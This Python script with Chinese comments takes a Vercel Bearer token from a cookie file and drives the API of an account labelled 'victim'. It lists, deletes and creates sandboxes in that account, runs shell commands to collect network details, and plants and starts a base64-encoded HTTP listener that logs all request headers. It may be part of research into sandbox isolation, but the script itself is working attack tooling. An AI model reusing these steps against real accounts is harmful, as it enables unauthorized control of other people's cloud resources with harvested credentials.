# -*- coding: utf-8 -*-
"""X 线: victim 账号 (boboli) 沙箱设置 - 创建沙箱 + 获取本机 IP + 启动 8080 监听"""
import base64, json, re, sys, time, urllib.request, urllib.error

raw = open(r'F:\scan\vercel_cookies2.txt', encoding='utf-8', errors='replace').read().strip()
m = re.search(r'authorization=\s*Bearer\s+(\S+)', raw, re.I)
TOK2 = m.group(1) if m else raw
TEAM2 = 'team_jnske5hDpDfj9eDG2PAfDqWf'
PROJ2 = 'prj_LX0QDsEAlWA0uRZvVTunSef3lllF'
BASE = 'https://api.vercel.com'

def api(method, path, body=None, timeout=60):
    req = urllib.request.Request(BASE + path, method=method)
    req.add_header('Authorization', 'Bearer ' + TOK2)
    req.add_header('Content-Type', 'application/json')
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode('utf-8', errors='replace')
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode('utf-8', errors='replace')[:600]
    except Exception as e:
        return -1, '%s' % e

def cmd_v(sid, command, args, timeout_ms=30000):
    body = {"command": command, "args": args, "wait": True, "logs": True, "timeout": timeout_ms}
    c, r = api('POST', '/v2/sandboxes/sessions/%s/cmd?teamId=%s' % (sid, TEAM2), body, timeout=timeout_ms / 1000 + 30)
    return c, r

# 列出 victim 现有沙箱
c, r = api('GET', '/v2/sandboxes?teamId=%s&project=%s&limit=50' % (TEAM2, PROJ2))
print('victim list:', c, flush=True)
try:
    for sb in json.loads(r).get('sandboxes', []):
        print('  -', sb.get('name'), sb.get('id'), 'state=', sb.get('state'), flush=True)
except Exception:
    print('parse err', r[:500], flush=True)

# 创建 xvictim1 (deny-all 只监听不回连)
name = 'xvictim1'
api('DELETE', '/v2/sandboxes/%s?teamId=%s&projectId=%s' % (name, TEAM2, PROJ2))
time.sleep(2)
body = {"projectId": PROJ2, "name": name, "networkPolicy": {"mode": "deny-all"}}
c, r = api('POST', '/v2/sandboxes?teamId=%s' % TEAM2, body)
print('create xvictim1:', c, r[:300], flush=True)
if c != 200:
    sys.exit(1)
sid = json.loads(r)['sandbox']['currentSessionId']
print('victim sid:', sid, flush=True)
time.sleep(3)

# 1) 本机 IP 信息
c, r = cmd_v(sid, 'sh', ['-c', 'hostname -I 2>/dev/null; ip -4 addr 2>/dev/null | grep "inet "; ip route 2>/dev/null | head -5'])
print('=== ip info ->', c, flush=True)
print(r[:1200], flush=True)

# 2) 注入监听脚本
LISTEN_CODE = '''# -*- coding: utf-8 -*-
import http.server, json, threading
LOG = '/vercel/sandbox/hit.log'

class H(http.server.BaseHTTPRequestHandler):
    def _do(self):
        try:
            with open(LOG, 'a') as f:
                f.write(json.dumps({'method': self.command, 'path': self.path,
                                    'headers': dict(self.headers.items())}) + '\\n')
        except Exception:
            pass
        self.send_response(200)
        self.send_header('Content-Length', '2')
        self.end_headers()
        self.wfile.write(b'ok')
    do_GET = _do
    do_POST = _do
    do_PUT = _do
    do_PATCH = _do
    do_DELETE = _do
    do_HEAD = _do
    def log_message(self, *a):
        pass

http.server.HTTPServer(('0.0.0.0', 8080), H).serve_forever()
'''
b64 = base64.b64encode(LISTEN_CODE.encode()).decode()
inj = "import base64;open('/vercel/sandbox/listen.py','wb').write(base64.b64decode('%s'))" % b64
c, r = cmd_v(sid, 'python3', ['-c', inj])
print('=== inject listen.py ->', c, flush=True)

# 3) 后台启动监听
c, r = cmd_v(sid, 'sh', ['-c', 'cd /vercel/sandbox && nohup python3 listen.py >/dev/null 2>&1 & echo LISTEN_PID=$!; sleep 1; ss -tlnp 2>/dev/null | grep 8080 || netstat -tlnp 2>/dev/null | grep 8080'])
print('=== start listener ->', c, flush=True)
print(r[:600], flush=True)

# 4) 再确认一次端口 + 记录 marker
c, r = cmd_v(sid, 'sh', ['-c', 'sleep 1; (echo > /dev/tcp/127.0.0.1/8080) 2>/dev/null && echo LOCAL_LOOPBACK_OK; cat /vercel/sandbox/hit.log 2>/dev/null'])
print('=== local check ->', c, flush=True)
print(r[:600], flush=True)

print('VICTIM_SID=%s' % sid, flush=True)
print('VICTIM_READY', flush=True)
